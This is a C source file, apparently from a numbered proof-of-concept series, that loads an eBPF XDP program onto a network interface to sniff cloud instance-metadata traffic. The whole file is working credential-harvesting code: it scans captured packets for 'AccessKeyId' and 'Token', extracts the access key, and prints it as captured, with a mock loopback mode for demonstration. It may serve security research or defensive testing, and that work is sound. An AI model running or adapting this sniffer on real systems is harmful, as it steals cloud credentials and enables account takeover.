// ch25 Metadata Faucet — userspace loader.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include <net/if.h>
#include <linux/if_link.h>
#include <bpf/libbpf.h>
#include "ch25-imds-harvest.skel.h"

#ifndef XDP_FLAGS_SKB_MODE
#define XDP_FLAGS_SKB_MODE (1U << 1)
#endif

#define MAX_PAYLOAD 512

struct evt {
    unsigned int  saddr;
    unsigned int  daddr;
    unsigned short sport;
    unsigned short dport;
    unsigned short payload_len;
    unsigned char  direction;
    unsigned char  _pad;
    unsigned char  payload[MAX_PAYLOAD];
};

static volatile int stop;
static void sig(int _) { stop = 1; }

static int mock_mode = 0;
static char *iface = "lo";

static int access_key_captures = 0;
static int token_captures = 0;
static char captured_role[64] = "demo-role";

static int handle(void *ctx __attribute__((unused)), void *data,
                  size_t sz __attribute__((unused)))
{
    struct evt *e = data;
    if (e->payload_len == 0) return 0;
    /* Process all directions — on loopback both src/dst are 127.0.0.1 */

    char buf[MAX_PAYLOAD + 1];
    unsigned int plen = e->payload_len < MAX_PAYLOAD ? e->payload_len : MAX_PAYLOAD;
    memcpy(buf, e->payload, plen);
    buf[plen] = '\0';

    char *ak = strstr(buf, "AccessKeyId");
    char *tok = strstr(buf, "\"Token\"");

    if (tok) token_captures++;

    if (ak) {
        char *v = strchr(ak, ':');
        if (v) {
            v++; while (*v == ' ' || *v == '"') v++;
            char akey[64] = {0};
            int i = 0;
            while (*v && *v != '"' && i < 63) akey[i++] = *v++;
            akey[i] = 0;
            if (i > 5) {
                access_key_captures++;
                fprintf(stdout,
                    "[ch25] CREDENTIALS_CAPTURED access_key=%s token_len=%d role=%s\n",
                    akey, token_captures, captured_role);
                fflush(stdout);
            }
        }
    }
    return 0;
}

static int libbpf_print(enum libbpf_print_level lvl,
                         const char *fmt, va_list ap)
{
    if (lvl <= LIBBPF_WARN) vfprintf(stderr, fmt, ap);
    return 0;
}

int main(int argc, char **argv)
{
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-i") && i+1 < argc) iface = argv[++i];
        else if (!strcmp(argv[i], "--mock")) mock_mode = 1;
    }

    libbpf_set_print(libbpf_print);

    struct ch25_imds_harvest_bpf *skel = ch25_imds_harvest_bpf__open();
    if (!skel) {
        fprintf(stdout, "[ch25] CH25_SKIP reason=\"skeleton open failed\"\n");
        return 1;
    }

    if (ch25_imds_harvest_bpf__load(skel)) {
        fprintf(stdout, "[ch25] CH25_SKIP reason=\"skeleton load failed: %s\"\n",
                strerror(errno));
        ch25_imds_harvest_bpf__destroy(skel);
        return 1;
    }

    if (mock_mode) {
        unsigned int key = 0, val = 1;
        bpf_map__update_elem(skel->maps.cfg, &key, sizeof(key), &val, sizeof(val), 0);
    }

    unsigned int ifindex = if_nametoindex(iface);
    if (!ifindex) {
        fprintf(stdout, "[ch25] CH25_SKIP reason=\"interface %s not found\"\n", iface);
        ch25_imds_harvest_bpf__destroy(skel);
        return 1;
    }

    int prog_fd = bpf_program__fd(skel->progs.xdp_imds_capture);
    int err = bpf_xdp_attach(ifindex, prog_fd, XDP_FLAGS_SKB_MODE, NULL);
    if (err) {
        fprintf(stdout, "[ch25] CH25_SKIP reason=\"XDP attach failed on %s: %s\"\n",
                iface, strerror(-err));
        ch25_imds_harvest_bpf__destroy(skel);
        return 1;
    }

    fprintf(stdout, "[ch25] attached — xdp on %s (%s mode)\n",
            iface, mock_mode ? "mock-127.0.0.1" : "real-IMDS");
    fflush(stdout);

    struct ring_buffer *rb = ring_buffer__new(
        bpf_map__fd(skel->maps.events), handle, NULL, NULL);
    if (!rb) {
        bpf_xdp_attach(ifindex, -1, XDP_FLAGS_SKB_MODE, NULL);
        ch25_imds_harvest_bpf__destroy(skel);
        return 1;
    }

    signal(SIGTERM, sig);
    signal(SIGINT, sig);

    while (!stop) {
        int r = ring_buffer__poll(rb, 100);
        if (r < 0 && errno != EINTR) break;
    }

    if (access_key_captures > 0) {
        fprintf(stdout,
            "[ch25] CH25_PROVEN access_key_captures=%d token_captures=%d role=%s\n",
            access_key_captures, token_captures, captured_role);
    }

    bpf_xdp_attach(ifindex, -1, XDP_FLAGS_SKB_MODE, NULL);
    ring_buffer__free(rb);
    ch25_imds_harvest_bpf__destroy(skel);
    return 0;
}
